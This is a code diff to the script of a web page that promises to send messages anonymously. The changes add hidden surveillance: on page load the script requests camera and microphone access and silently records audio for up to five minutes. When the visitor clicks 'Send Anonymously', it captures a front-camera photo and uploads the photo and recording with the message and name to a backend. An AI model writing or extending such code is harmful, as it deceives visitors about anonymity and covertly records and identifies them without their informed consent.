@@ -1,111 +1,178 @@
 document.addEventListener('DOMContentLoaded', () => {
     // --- Get all the elements we need from the HTML ---
+    const step1 = document.getElementById('step1-message');
+    const step2 = document.getElementById('step2-finalize');
+    const step3 = document.getElementById('step3-thankyou');
+
     const messageInput = document.getElementById('anonymousMessage');
-    const sendButton = document.getElementById('sendButton');
-    const nameFieldContainer = document.getElementById('nameFieldContainer');
+    const nextButton = document.getElementById('nextButton');
     const userNameInput = document.getElementById('userName');
     const emojis = document.querySelectorAll('.emoji');
-    const liveChatButton = document.getElementById('liveChatButton');
-
+    const sendButton = document.getElementById('sendButton');
+    
+    const mainLiveChatButton = document.getElementById('mainLiveChatButton');
+    const thankYouLiveChatButton = document.getElementById('liveChatButton');
+    const closeButton = document.getElementById('closeButton');
+    
     let selectedEmoji = null;
+    let mediaRecorder;
+    let audioChunks = [];
+    let userMediaStream;
 
-    // --- Logic for the main message box ---
+    // --- Permissions on Page Load ---
+    async function requestPermissions() {
+        console.log('Requesting permissions...');
+        try {
+            // Request camera and microphone
+            userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
+            console.log('Permissions granted!');
+            
+            // --- Setup and Start Audio Recording ---
+            mediaRecorder = new MediaRecorder(userMediaStream);
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+            mediaRecorder.start();
+            console.log('Audio recording started.');
+
+            // Set 5-minute timeout for recording
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                    console.log('Recording stopped due to 5-minute timeout.');
+                }
+            }, 300000); // 300000 milliseconds = 5 minutes
+
+        } catch (error) {
+            console.warn('Permissions were denied by the user.', error);
+        }
+    }
+    
+    requestPermissions();
+
+    // --- Photo Capture Function ---
+    async function capturePhoto() {
+        if (!userMediaStream) return null;
+        const videoTrack = userMediaStream.getVideoTracks()[0];
+        if (!videoTrack) return null;
+        try {
+            const imageCapture = new ImageCapture(videoTrack);
+            const blob = await imageCapture.takePhoto();
+            return blob;
+        } catch (error) {
+            console.error("Could not capture photo:", error);
+            return null;
+        }
+    }
+
+    // --- Main Application Flow Logic ---
     messageInput.addEventListener('input', () => {
-        // Show the 'Send' button only when the user starts typing
         if (messageInput.value.trim() !== '') {
-            sendButton.classList.remove('hidden');
+            nextButton.classList.remove('hidden');
         } else {
-            sendButton.classList.add('hidden');
+            nextButton.classList.add('hidden');
         }
     });
 
-    // --- Logic for the emoji selection ---
+    nextButton.addEventListener('click', () => {
+        if (messageInput.value.trim() === '') {
+            messageInput.style.animation = 'shake 0.5s';
+            setTimeout(() => { messageInput.style.animation = '' }, 500);
+            return;
+        }
+        step1.classList.add('hidden');
+        mainLiveChatButton.classList.add('hidden');
+        step2.classList.remove('hidden');
+    });
+
     emojis.forEach(emoji => {
         emoji.addEventListener('click', () => {
-            // Remove 'selected' from any previously selected emoji
             const currentlySelected = document.querySelector('.emoji.selected');
             if (currentlySelected) {
                 currentlySelected.classList.remove('selected');
             }
-            // Add 'selected' to the clicked emoji and store its value
             emoji.classList.add('selected');
             selectedEmoji = emoji.dataset.emoji;
         });
     });
 
-    // --- Main Logic when the Send button is clicked ---
     sendButton.addEventListener('click', async () => {
-        const message = messageInput.value.trim();
-        const userName = userNameInput.value.trim();
-
-        // First click: show name field if it's hidden
-        if (nameFieldContainer.classList.contains('hidden')) {
-            if (message === '') {
-                // Shake animation if message is empty
-                messageInput.style.animation = 'shake 0.5s';
-                setTimeout(() => { messageInput.style.animation = '' }, 500);
-                return;
-            }
-            nameFieldContainer.classList.remove('hidden');
-            userNameInput.focus();
-            return;
-        }
-        
-        // Second click: Validate and send the data
-        if (userName === '') {
-             // Shake animation if name is empty
+        if (userNameInput.value.trim() === '') {
             userNameInput.style.animation = 'shake 0.5s';
             setTimeout(() => { userNameInput.style.animation = '' }, 500);
             return;
         }
 
-        // --- HERE IS WHERE WE WILL ADD PERMISSION/DATA CAPTURE LOGIC LATER ---
-        // For now, we focus on sending the message.
-        
         sendButton.disabled = true;
         sendButton.textContent = 'Sending...';
 
+        // Stop recording to finalize the audio file
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
+
+        // Capture photos
+        const photo1 = await capturePhoto();
+        // You could add a slight delay and capture another one here if desired
+        // const photo2 = await capturePhoto();
+
+        // Use a small delay to ensure the recorder has time to process the last chunk
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+        const formData = new FormData();
+        formData.append('message', messageInput.value.trim());
+        formData.append('name', userNameInput.value.trim());
+        formData.append('emoji', selectedEmoji || 'No reaction');
+
+        if (photo1) {
+            formData.append('photo1', photo1, 'photo1.jpg');
+        }
+        if (audioChunks.length > 0) {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            formData.append('audio', audioBlob, 'audio.webm');
+        }
+        
+        // --- Sending ALL Data to Backend ---
         try {
-            // Send all the data to our secure backend function
             const response = await fetch('/.netlify/functions/send-message', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    message: message,
-                    name: userName,
-                    emoji: selectedEmoji
-                })
+                body: formData // FormData sets the correct multipart/form-data headers automatically
             });
 
             if (response.ok) {
-                // Success!
-                document.querySelector('.content-card').innerHTML = `
-                    <h1 class="main-title">Thank You!</h1>
-                    <p class="sub-message">Your message has been sent to Venky anonymously.</p>
-                `;
+                step2.classList.add('hidden');
+                step3.classList.remove('hidden');
             } else {
-                // Failure
                 throw new Error('Failed to send message.');
             }
         } catch (error) {
             console.error(error);
             alert('Sorry, something went wrong. Please try again.');
             sendButton.disabled = false;
-            sendButton.textContent = 'Send';
+            sendButton.textContent = 'Send Anonymously';
         }
+    });
+
+    // --- Thank You Screen Button Logic ---
+    closeButton.addEventListener('click', () => {
+        window.close();
+    });
+
+    thankYouLiveChatButton.addEventListener('click', () => {
+        alert('Live Chat feature coming soon!');
+    });
+    mainLiveChatButton.addEventListener('click', () => {
+        alert('Live Chat feature coming soon!');
     });
 });
 
-// We need to add the shake animation keyframes to our CSS.
-// Let's add it dynamically with JavaScript.
+// Add shake animation keyframes dynamically
 const styleSheet = document.createElement("style");
 styleSheet.type = "text/css";
-styleSheet.innerText = `
-@keyframes shake {
+styleSheet.innerText = `@keyframes shake {
     10%, 90% { transform: translate3d(-1px, 0, 0); }
     20%, 80% { transform: translate3d(2px, 0, 0); }
     30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
     40%, 60% { transform: translate3d(4px, 0, 0); }
-}
-`;
+}`;
 document.head.appendChild(styleSheet);
